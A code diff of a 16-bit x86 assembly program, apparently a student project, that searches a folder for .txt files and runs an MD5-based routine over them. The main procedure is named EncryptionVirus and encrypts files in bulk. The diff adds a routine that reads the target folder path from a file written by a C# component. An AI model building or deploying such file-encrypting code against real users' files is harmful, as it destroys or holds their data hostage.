@@ -1,24 +1,25 @@
 Include irvine16.inc
 
-FileControlBlock struc 			;File Data
-db 22 dup(?) 					;header info 
-FileTime dw ? 					;time stamp of file
-FileDate dw ? 					;date stamp of file
-FileSize dd ? 					;size of file
-FileName db 64 dup(0) 			;name of file found by DOS
+FileControlBlock struc 								;File Data
+db 22 dup(?) 										;header info 
+FileTime dw ? 										;time stamp of file
+FileDate dw ? 										;date stamp of file
+FileSize dd ? 										;size of file
+FileName db 64 dup(0) 								;name of file found by DOS
 FileControlBlock ends
 
 .DATA
-FolderPath db "C:\N\*.txt",0 	;Path of search folder
-DTA FileControlBlock <>			;Point the file data struct to user-defined DTA
-FileHandle dw ?
-BufferSize = 64					;To read 512-bit per time (64 byte)
-FileFullPath db 260 DUP(?),0	;File full path after adding name found by DOS to it
-Buffer db bufferSize dup(0),0	;Buffer to read data from file to it
-CurrentSize dw 0				;Indicator to file size to be used in padding (step in MD5)
-TotalSize dword 0				;To count how many characters remaon
-RotationIndex Byte 0			;Index to Rotation array to indicate number of rotations per round
-TIndex DWord 0					;Index to T array to use per round
+SubFolderFilePath db "C:\SFolder.txt",0				;Path to file contain sub-folder path get from c#
+FolderPath Byte 260 DUP(0),0 						;Path of search folder
+DTA FileControlBlock <>								;Point the file data struct to user-defined DTA
+FileHandle dw ?					
+BufferSize = 64										;To read 512-bit per time (64 byte)
+FileFullPath db 260 DUP(0),0						;File full path after adding name found by DOS to it
+Buffer db BufferSize DUP(0),0						;Buffer to read data from file to it
+CurrentSize dw 0									;Indicator to file size to be used in padding (step in MD5)
+TotalSize DWord 0									;To count how many characters remaon
+RotationIndex Byte 0								;Index to Rotation array to indicate number of rotations per round
+TIndex DWord 0										;Index to T array to use per round
 K DWord 0
 
 A DWord 67452301h
@@ -42,7 +43,6 @@ Rotation Byte 7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22
 		 Byte 6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
 			  
 HashedData DWord 4 DUP(?)
-
 HexaValues Byte '0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'
 
 DataToBeWritten Byte 32 DUP(0),0
@@ -62,8 +62,9 @@ int 21h
 mov AH , 4Eh					;Dos function search for 1st matching file
 mov CX , 1						;Normal attribute
 mov DX , SI
-int 21h    
+int 21h  
 JC Quit                             ; call Dos
+
 RET
 FindFirstFile ENDP
 
@@ -139,6 +140,7 @@ mov CX,  BufferSize		;Number of bytes to read
 mov DX,offset Buffer                                              
 int 21h  
 JC Quit
+
 RET
 ReadFile ENDP
 
@@ -580,13 +582,48 @@ mov D,78543210h
 
 RET
 ResetData ENDP
+
+;----------------------------------------------------------------------------------------------------------
+;get the path of current sub folder C# part find 
+;Recieves : Nothing
+;Returns  : Modify in FolderPath by the new Path
+;----------------------------------------------------------------------------------------------------------
+GetSubFolder PROC USES EDX ECX ESI EDI EBX
+BufferSize = 260
+mov DX,offset SubFolderFilePath-1
+Call OpenFile
+mov BX,FileHandle
+Call ReadFile
+mov ECX,0
+mov CX,AX
+mov AH , 3Eh			;Close file
+int 21h
+
+mov SI,offset Buffer
+mov DI, offset FolderPath
+
+CopyFolderPath:
+mov AL,[SI]
+mov [DI],AL
+INC SI
+INC DI
+LOOP CopyFolderPath
+
+RET
+GetSubFolder ENDP 
+
 ;----------------------------------------------------------------------------
 ;The Main Controller of the project to call all functions
 ;Recieves: Nothing
 ;Returns : Nothing
 ;----------------------------------------------------------------------------
 EncryptionVirus PROC
+
+Call GetSubFolder
+
+BufferSize = 64
 mov SI , offset FolderPath
+
 Call FindFirstFile
 
 EncryptFiles:
